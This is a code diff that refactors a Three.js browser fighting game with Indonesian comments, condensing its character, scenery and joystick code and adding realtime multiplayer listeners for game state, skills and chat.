-            // Tangan kanan
-            const rightHandGeometry = new THREE.SphereGeometry(0.15, 16, 16);
-            const rightHand = createBodyPart(rightHandGeometry, skinMaterial, [0.9, 2.3, 0]);
-            character.add(rightHand);
-            
-            // 5. Kaki
-            // Kaki kiri
-            const leftLegGeometry = new THREE.CylinderGeometry(0.2, 0.13, 2.2, 32);
-            const leftLeg = createBodyPart(leftLegGeometry, pantsMaterial, [-0.3, 1.0, 0]);
-            leftLeg.userData = { type: 'leftLeg' };
-            character.add(leftLeg);
-            playerLegs.left = leftLeg;
-            
-            // Kaki kanan 
-            const rightLegGeometry = new THREE.CylinderGeometry(0.2, 0.13, 2.2, 32);
-            const rightLeg = createBodyPart(rightLegGeometry, pantsMaterial, [0.3, 1.0, 0]);
-            rightLeg.userData = { type: 'rightLeg' };
-            character.add(rightLeg);
-            playerLegs.right = rightLeg;
-            
-            return character;
-        }
-
-        // Buat musuh dengan warna ungu-hitam dan tanduk
-        function createEnemy() {
-            // Material untuk musuh
-            const skinMaterial = new THREE.MeshLambertMaterial({ color: 0x4B0082 }); // Ungu
-            const clothingMaterial = new THREE.MeshLambertMaterial({ color: 0x000000 }); // Hitam
-            
-            // Membuat musuh
-            const enemy = new THREE.Group();
-            
-            // 1. Kepala
-            const headGeometry = new THREE.SphereGeometry(0.5, 32, 32);
-            const head = createBodyPart(headGeometry, skinMaterial, [0, 5.0, 0]);
-            enemy.add(head);
-            
-            // 2. Tanduk
-            const hornGeometry = new THREE.ConeGeometry(0.1, 0.5, 8);
-            const leftHorn = createBodyPart(hornGeometry, clothingMaterial, [-0.2, 5.4, 0.3], [0, 0, 0.3]);
-            const rightHorn = createBodyPart(hornGeometry, clothingMaterial, [0.2, 5.4, 0.3], [0, 0, -0.3]);
-            enemy.add(leftHorn);
-            enemy.add(rightHorn);
-            
-            // 3. Leher
-            const neckGeometry = new THREE.CylinderGeometry(0.15, 0.15, 0.3, 32);
-            const neck = createBodyPart(neckGeometry, skinMaterial, [0, 4.5, 0]);
-            enemy.add(neck);
-            
-            // 4. Pundak dan badan
-            const torsoGeometry = new THREE.CylinderGeometry(0.7, 0.5, 1.8, 32);
-            const torso = createBodyPart(torsoGeometry, clothingMaterial, [0, 3.2, 0]);
-            enemy.add(torso);
-            
-            // 5. Tangan
-            // Lengan atas kiri
-            const leftUpperArmGeometry = new THREE.CylinderGeometry(0.15, 0.15, 0.8, 32);
-            const leftUpperArm = createBodyPart(leftUpperArmGeometry, clothingMaterial, [-0.9, 3.5, 0]);
-            enemy.add(leftUpperArm);
-            
-            // Lengan bawah kiri
-            const leftForearmGeometry = new THREE.CylinderGeometry(0.12, 0.12, 0.7, 32);
-            const leftForearm = createBodyPart(leftForearmGeometry, skinMaterial, [-0.9, 2.7, 0]);
-            enemy.add(leftForearm);
-            
-            // Tangan kiri
-            const leftHandGeometry = new THREE.SphereGeometry(0.15, 16, 16);
-            const leftHand = createBodyPart(leftHandGeometry, skinMaterial, [-0.9, 2.3, 0]);
-            enemy.add(leftHand);
-            
-            // Lengan atas kanan
-            const rightUpperArmGeometry = new THREE.CylinderGeometry(0.15, 0.15, 0.8, 32);
-            const rightUpperArm = createBodyPart(rightUpperArmGeometry, clothingMaterial, [0.9, 3.5, 0]);
-            enemy.add(rightUpperArm);
-            
-            // Lengan bawah kanan
-            const rightForearmGeometry = new THREE.CylinderGeometry(0.12, 0.12, 0.7, 32);
-            const rightForearm = createBodyPart(rightForearmGeometry, skinMaterial, [0.9, 2.7, 0]);
-            enemy.add(rightForearm);
-            
-            // Tangan kanan
-            const rightHandGeometry = new THREE.SphereGeometry(0.15, 16, 16);
-            const rightHand = createBodyPart(rightHandGeometry, skinMaterial, [0.9, 2.3, 0]);
-            enemy.add(rightHand);
-            
-            // 6. Kaki
-            // Kaki kiri
-            const leftLegGeometry = new THREE.CylinderGeometry(0.2, 0.13, 2.2, 32);
-            const leftLeg = createBodyPart(leftLegGeometry, clothingMaterial, [-0.3, 1.0, 0]);
-            leftLeg.userData = { type: 'leftLeg' };
-            enemy.add(leftLeg);
-            enemyLegs.left = leftLeg;
-            
-            // Kaki kanan 
-            const rightLegGeometry = new THREE.CylinderGeometry(0.2, 0.13, 2.2, 32);
-            const rightLeg = createBodyPart(rightLegGeometry, clothingMaterial, [0.3, 1.0, 0]);
-            rightLeg.userData = { type: 'rightLeg' };
-            enemy.add(rightLeg);
-            enemyLegs.right = rightLeg;
-            
-            return enemy;
-        }
-
-        // Buat tanah hijau
-        function createGround() {
-            const groundGeometry = new THREE.PlaneGeometry(30, 30);
-            const groundMaterial = new THREE.MeshStandardMaterial({ 
-                color: 0x00ff00, 
-                roughness: 0.8 
-            });
-            const ground = new THREE.Mesh(groundGeometry, groundMaterial);
+            // Ground
+            const ground = new THREE.Mesh(
+                new THREE.PlaneGeometry(30, 30),
+                new THREE.MeshStandardMaterial({ color: 0x228B22, roughness: 0.8 })
+            );
             ground.rotation.x = -Math.PI / 2;
             ground.receiveShadow = true;
             scene.add(ground);
-        }
-
-        // Buat pohon-pohon (hanya 1)
-        function createTrees() {
-            const treePositions = [
-                { x: -10, z: -10 },
-            ];
-
-            for (let i = 0; i < 1; i++) {
-                // Batang pohon
-                const trunkGeometry = new THREE.CylinderGeometry(0.5, 0.7, 4, 8);
-                const trunkMaterial = new THREE.MeshStandardMaterial({ color: 0x8B4513 });
-                const trunk = new THREE.Mesh(trunkGeometry, trunkMaterial);
-                trunk.position.set(treePositions[i].x, 2, treePositions[i].z);
-                trunk.castShadow = true;
-                scene.add(trunk);
-
-                // Daun pohon
-                const leavesGeometry = new THREE.SphereGeometry(2, 8, 8);
-                const leavesMaterial = new THREE.MeshStandardMaterial({ color: 0x228B22 });
-                const leaves = new THREE.Mesh(leavesGeometry, leavesMaterial);
-                leaves.position.set(treePositions[i].x, 5, treePositions[i].z);
-                leaves.castShadow = true;
-                scene.add(leaves);
-            }
-        }
-        
-        // Buat rumah
-        function createHouse() {
-            const houseGroup = new THREE.Group();
             
-            // Dinding rumah
-            const wallMaterial = new THREE.MeshStandardMaterial({ color: 0xF5F5DC });
-            const wallGeometry = new THREE.BoxGeometry(8, 8, 8);
-            const walls = new THREE.Mesh(wallGeometry, wallMaterial);
-            walls.position.y = 2;
-            walls.castShadow = true;
-            walls.receiveShadow = true;
-            houseGroup.add(walls);
-            
-            // Atap
-            const roofMaterial = new THREE.MeshStandardMaterial({ color: 0x8B4513 });
-            const roofGeometry = new THREE.ConeGeometry(6, 4, 4);
-            const roof = new THREE.Mesh(roofGeometry, roofMaterial);
-            roof.position.y = 8;
-            roof.rotation.y = Math.PI / 4;
-            roof.castShadow = true;
-            houseGroup.add(roof);
-            
-            // Pintu
-            const doorMaterial = new THREE.MeshStandardMaterial({ color: 0x8B4513 });
-            const doorGeometry = new THREE.BoxGeometry(1.5, 2.5, 0.1);
-            const door = new THREE.Mesh(doorGeometry, doorMaterial);
-            door.position.set(0, 1.25, 4);
-            door.castShadow = true;
-            houseGroup.add(door);
-            
-            // Jendela
-            const windowMaterial = new THREE.MeshStandardMaterial({ color: 0x87CEEB });
-            const windowGeometry = new THREE.BoxGeometry(1, 1, 0.1);
-            const window1 = new THREE.Mesh(windowGeometry, windowMaterial);
-            window1.position.set(-2, 2.5, 4);
-            houseGroup.add(window1);
-            
-            const window2 = new THREE.Mesh(windowGeometry, windowMaterial);
-            window2.position.set(2, 2.5, 4);
-            houseGroup.add(window2);
-            
-            houseGroup.position.set(0, 0, 0);
-            scene.add(houseGroup);
-            house = houseGroup;
-            
-            // Area aman di dalam rumah (untuk deteksi)
-            house.userData = {
-                isHouse: true,
-                safeArea: {
-                    minX: -3.5,
-                    maxX: 3.5,
-                    minZ: -3.5,
-                    maxZ: 3.5
-                }
-            };
-        }
-        
-        // Cek apakah player berada di dalam rumah
-        function isPlayerInHouse() {
-            if (!house) return false;
-            
-            const safeArea = house.userData.safeArea;
-            return (
-                player.position.x >= safeArea.minX &&
-                player.position.x <= safeArea.maxX &&
-                player.position.z >= safeArea.minZ &&
-                player.position.z <= safeArea.maxZ
+            // Tree
+            const trunk = new THREE.Mesh(
+                new THREE.CylinderGeometry(0.5, 0.7, 4, 8),
+                new THREE.MeshStandardMaterial({ color: 0x8B4513 })
             );
+            trunk.position.set(-10, 2, -10);
+            scene.add(trunk);
+            const leaves = new THREE.Mesh(
+                new THREE.SphereGeometry(2, 8, 8),
+                new THREE.MeshStandardMaterial({ color: 0x006400 })
+            );
+            leaves.position.set(-10, 5, -10);
+            scene.add(leaves);
+            
+            // House
+            const house = new THREE.Group();
+            house.add(new THREE.Mesh(new THREE.BoxGeometry(8, 8, 8), new THREE.MeshStandardMaterial({ color: 0xF5F5DC })));
+            const roof = new THREE.Mesh(new THREE.ConeGeometry(6, 4, 4), new THREE.MeshStandardMaterial({ color: 0x8B4513 }));
+            roof.position.y = 6;
+            roof.rotation.y = Math.PI / 4;
+            house.add(roof);
+            house.position.set(0, 0, 0);
+            scene.add(house);
+            
+            // Player
+            player = createCharacter(0x2E64FE);
+            player.position.set(0, 1, -3);
+            scene.add(player);
+            
+            // Enemy
+            enemy = createCharacter(0x4B0082);
+            enemy.position.set(5, 1, 5);
+            scene.add(enemy);
+            
+            // Joystick
+            joystick = document.getElementById('joystick');
+            joystickHandle = document.getElementById('joystick-handle');
+            
+            setupEvents();
+            
+            // Multiplayer listeners
+            playersRef.on('value', snap => renderOtherPlayers(snap.val()));
+            gameStateRef.on('value', snap => {
+                const gs = snap.val();
+                if (gs && !gameOver && !gameWin) {
+                    if (gs.enemyPosition) enemy.position.set(gs.enemyPosition.x, gs.enemyPosition.y, gs.enemyPosition.z);
+                    if (gs.enemyHP !== undefined && gs.enemyHP < enemyHP) enemyHP = gs.enemyHP;
+                    if (gs.gameOver && !gameOver) triggerDefeat();
+                    if (gs.gameWin && !gameWin) triggerWin();
+                    updateUI();
+                }
+            });
+            skillEventsRef.on('child_added', snap => {
+                const evt = snap.val();
+                if (evt.playerId !== playerId && evt.type === 'thunder') {
+                    createThunderEffect(new THREE.Vector3(evt.position.x, evt.position.y, evt.position.z));
+                }
+            });
+            chatRef.on('child_added', snap => {
+                const msg = snap.val();
+                if (msg.playerId !== playerId) displayChatMessage(msg.playerName, msg.text);
+            });
+            
+            currentPlayerRef.onDisconnect().remove();
+            
+            animate();
         }
-
-        // Setup event listeners untuk kontrol
-        function setupEventListeners() {
-            // Joystick events
+        
+        function createCharacter(color) {
+            const group = new THREE.Group();
+            const skin = new THREE.MeshLambertMaterial({ color: 0xF5D0A9 });
+            const cloth = new THREE.MeshLambertMaterial({ color });
+            
+            group.add(new THREE.Mesh(new THREE.SphereGeometry(0.5, 32, 32), skin)).position.y = 5.0;
+            group.add(new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.15, 0.3, 32), skin)).position.y = 4.5;
+            group.add(new THREE.Mesh(new THREE.CylinderGeometry(0.7, 0.5, 1.8, 32), cloth)).position.y = 3.2;
+            
+            const legGeo = new THREE.CylinderGeometry(0.2, 0.13, 2.2, 32);
+            const legMat = new THREE.MeshLambertMaterial({ color: 0x444444 });
+            const leftLeg = new THREE.Mesh(legGeo, legMat);
+            leftLeg.position.set(-0.3, 1.0, 0);
+            leftLeg.userData = { type: 'leftLeg' };
+            group.add(leftLeg);
+            const rightLeg = new THREE.Mesh(legGeo, legMat);
+            rightLeg.position.set(0.3, 1.0, 0);
+            rightLeg.userData = { type: 'rightLeg' };
+            group.add(rightLeg);
+            
+            // Arms
+            const armGeo = new THREE.CylinderGeometry(0.12, 0.12, 0.7, 32);
+            group.add(new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.15, 0.8, 32), cloth)).position.set(-0.9, 3.5, 0);
+            group.add(new THREE.Mesh(armGeo, skin)).position.set(-0.9, 2.7, 0);
+            group.add(new THREE.Mesh(new THREE.CylinderGeometry(0.15, 0.15, 0.8, 32), cloth)).position.set(0.9, 3.5, 0);
+            group.add(new THREE.Mesh(armGeo, skin)).position.set(0.9, 2.7, 0);
+            
+            return group;
+        }
+        
+        function setupEvents() {
             joystick.addEventListener('mousedown', onJoystickStart);
-            joystick.addEventListener('touchstart', onJoystickStart);
-            
+            joystick.addEventListener('touchstart', onJoystickStart, { passive: false });
             document.addEventListener('mousemove', onJoystickMove);
-            document.addEventListener('touchmove', onJoystickMove);
-            
+            document.addEventListener('touchmove', onJoystickMove, { passive: false });
             document.addEventListener('mouseup', onJoystickEnd);
             document.addEventListener('touchend', onJoystickEnd);
             
-            // Tombol skills
             document.getElementById('ultimate').addEventListener('click', activateUltimate);
             document.getElementById('thunder-skill').addEventListener('click', activateThunderSkill);
+            document.addEventListener('click', (e) => {
+                if (!e.target.closest('.btn') && !e.target.closest('#joystick') && !e.target.closest('#chat-container')) {
+                    useAttack();
+                }
+            });
             
-            // Tombol attack (tap pada area mana saja untuk menyerang)
-            document.addEventListener('click', useAttack);
-            
-            // Restart button
             document.getElementById('restart-btn').addEventListener('click', restartGame);
             document.getElementById('win-restart-btn').addEventListener('click', restartGame);
-            
-            // Tombol kembali ke menu
             document.getElementById('back-to-menu-btn').addEventListener('click', backToMenu);
             document.getElementById('back-to-menu-win-btn').addEventListener('click', backToMenu);
             
-            // Chat events
             document.getElementById('chat-toggle').addEventListener('click', toggleChat);
             document.getElementById('chat-close').addEventListener('click', toggleChat);
             document.getElementById('chat-send').addEventListener('click', sendChatMessage);
             document.getElementById('chat-input').addEventListener('keypress', (e) => {
-                if (e.key === 'Enter') {
-                    sendChatMessage();
-                }
+                if (e.key === 'Enter') sendChatMessage();
             });
             
-            // Window resize event
-            window.addEventListener('resize', onWindowResize);
+            window.addEventListener('resize', () => {
+                camera.aspect = window.innerWidth / window.innerHeight;
+                camera.updateProjectionMatrix();
+                renderer.setSize(window.innerWidth, window.innerHeight);
+            });
         }
-
-        // Joystick handlers
-        function onJoystickStart(event) {
-            event.preventDefault();
-            isJoystickActive = true;
-            updateJoystickPosition(event);
-        }
-
-        function onJoystickMove(event) {
-            if (!isJoystickActive) return;
-            event.preventDefault();
-            updateJoystickPosition(event);
-        }
-
-        function onJoystickEnd() {
-            isJoystickActive = false;
-            joystickHandle.style.top = '30px';
-            joystickHandle.style.left = '30px';
-            playerVelocity.set(0, 0, 0);
-            isPlayerWalking = false;
-        }
-
-        function updateJoystickPosition(event) {
+        
+        function onJoystickStart(e) { e.preventDefault(); isJoystickActive = true; updateJoystickPos(e); }
+        function onJoystickMove(e) { if (!isJoystickActive) return; e.preventDefault(); updateJoystickPos(e); }
+        function onJoystickEnd() { isJoystickActive = false; joystickHandle.style.top = '30px'; joystickHandle.style.left = '30px'; playerVelocity.set(0, 0, 0); isPlayerWalking = false; }
+        
+        function updateJoystickPos(e) {
             const rect = joystick.getBoundingClientRect();
-            const centerX = rect.left + rect.width / 2;
-            const centerY = rect.top + rect.height / 2;
+            const cx = rect.left + rect.width / 2;
+            const cy = rect.top + rect.height / 2;
+            let clientX = e.clientX || (e.touches && e.touches[0].clientX) || 0;
+            let clientY = e.clientY || (e.touches && e.touches[0].clientY) || 0;
             
-            let clientX, clientY;
+            const dx = Math.max(-30, Math.min(30, clientX - cx));
+            const dy = Math.max(-30, Math.min(30, clientY - cy));
             
-            if (event.type.includes('mouse')) {
-                clientX = event.clientX;
-                clientY = event.clientY;
-            } else {
-                clientX = event.touches[0].clientX;
-                clientY = event.touches[0].clientY;
-            }
+            joystickHandle.style.left = (30 + dx) + 'px';
+            joystickHandle.style.top = (30 + dy) + 'px';
             
-            const deltaX = clientX - centerX;
-            const deltaY = clientY - centerY;
+            playerVelocity.x = (dx / 30) * playerSpeed;
+            playerVelocity.z = (dy / 30) * playerSpeed;
             
-            const distance = Math.min(Math.sqrt(deltaX * deltaX + deltaY * deltaY), 30);
-            const angle = Math.atan2(deltaY, deltaX);
-            
-            const handleX = 30 + distance * Math.cos(angle);
-            const handleY = 30 + distance * Math.sin(angle);
-            
-            joystickHandle.style.left = `${handleX}px`;
-            joystickHandle.style.top = `${handleY}px`;
-            
-            // Perbaikan arah gerakan - sekarang sesuai dengan arah joystick
-            const normalizedX = deltaX / 30;
-            const normalizedY = deltaY / 30;
-            
-            // Perbaikan: Gerakan maju (ke atas) menggerakkan karakter ke depan
-            // Gerakan mundur (ke bawah) menggerakkan karakter ke belakang
-            playerVelocity.x = normalizedX * playerSpeed;
-            playerVelocity.z = normalizedY * playerSpeed; // Diperbaiki: tidak ada minus
-            
-            // Update player rotation
-            if (playerVelocity.x !== 0 || playerVelocity.z !== 0) {
-                playerDirection.x = playerVelocity.x;
-                playerDirection.z = playerVelocity.z;
-                playerDirection.normalize();
-                
-                // Rotasi karakter sesuai arah gerakan
+            if (Math.abs(dx) > 2 || Math.abs(dy) > 2) {
                 player.rotation.y = Math.atan2(playerVelocity.x, playerVelocity.z);
-                
                 isPlayerWalking = true;
             } else {
                 isPlayerWalking = false;
             }
         }
-
-        // Update HP musuh di UI
-        function updateEnemyHP() {
-            document.getElementById('enemy-hp').textContent = '💜 ' + enemyHP;
-        }
-
-        // Update HP player di UI
-        function updatePlayerHP() {
-            document.getElementById('player-hp').textContent = '❤️ ' + playerHP;
-        }
-
-        // Window resize handler
-        function onWindowResize() {
-            camera.aspect = window.innerWidth / window.innerHeight;
-            camera.updateProjectionMatrix();
-            renderer.setSize(window.innerWidth, window.innerHeight);
-        }
         
-        // Update animasi berjalan
-        function updateWalkingAnimation() {
-            if (isPlayerWalking && !isPlayerStunned) {
-                walkCycle += 0.3;
-                
-                // Animasi kaki player
-                if (playerLegs.left) {
-                    playerLegs.left.rotation.x = Math.sin(walkCycle) * 0.3;
-                }
-                if (playerLegs.right) {
-                    playerLegs.right.rotation.x = -Math.sin(walkCycle) * 0.3;
-                }
-                
-                // Animasi sepatu player (mengikuti kaki)
-                if (playerShoes.left) {
-                    playerShoes.left.position.y = 0.1 + Math.sin(walkCycle) * 0.05;
-                }
-                if (playerShoes.right) {
-                    playerShoes.right.position.y = 0.1 - Math.sin(walkCycle) * 0.05;
-                }
-            } else {
-                // Reset posisi kaki dan sepatu saat tidak bergerak
-                if (playerLegs.left) playerLegs.left.rotation.x = 0;
-                if (playerLegs.right) playerLegs.right.rotation.x = 0;
-                if (playerShoes.left) playerShoes.left.position.y = 0.1;
-                if (playerShoes.right) playerShoes.right.position.y = 0.1;
-            }
-        }
-        
-        // Update animasi musuh
-        function updateEnemyAnimation() {
-            // Animasi kaki musuh
-            if (enemyLegs.left) {
-                enemyLegs.left.rotation.x = Math.sin(enemyAnimationTime * 5) * 0.3;
-            }
-            if (enemyLegs.right) {
-                enemyLegs.right.rotation.x = -Math.sin(enemyAnimationTime * 5) * 0.3;
-            }
-            
-            // Animasi sepatu musuh (mengikuti kaki)
-            if (enemyShoes.left) {
-                enemyShoes.left.position.y = 0.1 + Math.sin(enemyAnimationTime * 5) * 0.05;
-            }
-            if (enemyShoes.right) {
-                enemyShoes.right.position.y = 0.1 - Math.sin(enemyAnimationTime * 5) * 0.05;
-            }
-        }
-
-        // Animasi
         function animate() {
             requestAnimationFrame(animate);
-            
-            const delta = clock.getDelta();
+            const delta = Math.min(clock.getDelta(), 0.1);
             
             if (!gameOver && !gameWin) {
-                // Update player position (jika tidak sedang stunned)
                 if (!isPlayerStunned) {
                     player.position.x += playerVelocity.x;
                     player.position.z += playerVelocity.z;
                 }
-                
-                // Batasi area gerak player
                 player.position.x = Math.max(-14, Math.min(14, player.position.x));
                 player.position.z = Math.max(-14, Math.min(14, player.position.z));
                 
-                // Update enemy behavior
-                updateEnemy(delta);
+                // Enemy AI
+                const dir = new THREE.Vector3().subVectors(player.position, enemy.position).normalize();
+                const dist = player.position.distanceTo(enemy.position);
+                const inHouse = Math.abs(player.position.x) < 3.5 && Math.abs(player.position.z) < 3.5;
                 
-                // Update player HP
-                updatePlayerHP();
+                if (dist > 2 && !inHouse && !isPlayerStunned) {
+                    enemy.position.x += dir.x * 0.03;
+                    enemy.position.z += dir.z * 0.03;
+                    enemy.rotation.y = Math.atan2(dir.x, dir.z);
+                } else if (!inHouse && !isUltimateActive && !isPlayerStunned) {
+                    lastEnemyAttackTime += delta;
+                    if (lastEnemyAttackTime >= enemyAttackInterval) {
+                        playerHP -= enemyAttackDamage;
+                        lastEnemyAttackTime = 0;
+                        updateUI();
+                        if (playerHP <= 0) { playerHP = 0; triggerDefeat(); }
+                        saveGameState();
+                    }
+                }
                 
-                // Update skills
+                if (attackCooldown > 0) attackCooldown -= delta;
+                
                 updateUltimate(delta);
                 updateThunderSkill(delta);
                 updateEnemySkill(delta);
                 
-                // Update animasi
-                updateWalkingAnimation();
-                updateEnemyAnimation();
+                // Walking animation
+                if (isPlayerWalking && !isPlayerStunned) {
+                    walkCycle += 0.3;
+                    player.children.forEach(child => {
+                        if (child.userData?.type === 'leftLeg') child.rotation.x = Math.sin(walkCycle) * 0.3;
+                        if (child.userData?.type === 'rightLeg') child.rotation.x = -Math.sin(walkCycle) * 0.3;
+                    });
+                }
                 
-                // Update camera position
+                enemyAnimationTime += delta;
+                enemy.children.forEach(child => {
+                    if (child.userData?.type === 'leftLeg') child.rotation.x = Math.sin(enemyAnimationTime * 5) * 0.3;
+                    if (child.userData?.type === 'rightLeg') child.rotation.x = -Math.sin(enemyAnimationTime * 5) * 0.3;
+                });
+                
                 camera.position.x = player.position.x;
                 camera.position.z = player.position.z + 10;
                 camera.lookAt(player.position.x, player.position.y + 2, player.position.z);
                 
-                // Simpan state game secara berkala
-                if (Math.random() < 0.1) { // 10% chance setiap frame
-                    saveGameState();
-                }
+                if (Math.random() < 0.05) { savePlayerData(); saveGameState(); }
             }
             
             renderer.render(scene, camera);
         }
-
-        // Update perilaku musuh
-        function updateEnemy(delta) {
-            // Cek apakah player berada di dalam rumah
-            const playerInHouse = isPlayerInHouse();
-            
-            // Gerakan musuh mengikuti player
-            const direction = new THREE.Vector3();
-            direction.subVectors(player.position, enemy.position).normalize();
-            
-            // Jarak antara musuh dan player
-            const distance = player.position.distanceTo(enemy.position);
-            
-            if (distance > 2 && !playerInHouse && !isPlayerStunned) {
-                // Musuh bergerak mendekati player
-                enemy.position.x += direction.x * 0.03;
-                enemy.position.z += direction.z * 0.03;
-                
-                // Rotasi musuh menghadap player
-                enemy.rotation.y = Math.atan2(direction.x, direction.z);
-            } else if (!playerInHouse && !isUltimateActive && !isPlayerStunned) { // Hanya serang jika player tidak dalam mode ultimate
-                // Musuh menyerang jika dekat dan player tidak di rumah
-                lastEnemyAttackTime += delta;
-                if (lastEnemyAttackTime >= enemyAttackInterval) {
-                    playerHP -= enemyAttackDamage;
-                    lastEnemyAttackTime = 0;
-                    
-                    // Cek jika player mati
-                    if (playerHP <= 0) {
-                        playerHP = 0;
-                        gameOver = true;
-                        document.getElementById('game-over').style.display = 'block';
-                        
-                        // Update rank - KALAH
-                        updateRank(false);
-                        
-                        saveGameState();
-                    }
-                }
-            }
-            
-            // Animasi musuh
-            enemyAnimationTime += delta;
-        }
-
-        // Inisialisasi game
+        
+        // ========== INIT ==========
+        document.getElementById('multiplayer-status').textContent = `🎮 ${playerName} - Menghubungkan...`;
         init();
+        console.log('✅ Game fully loaded - Player:', playerName, 'ID:', targetId);
     </script>
 </body>
 </html>
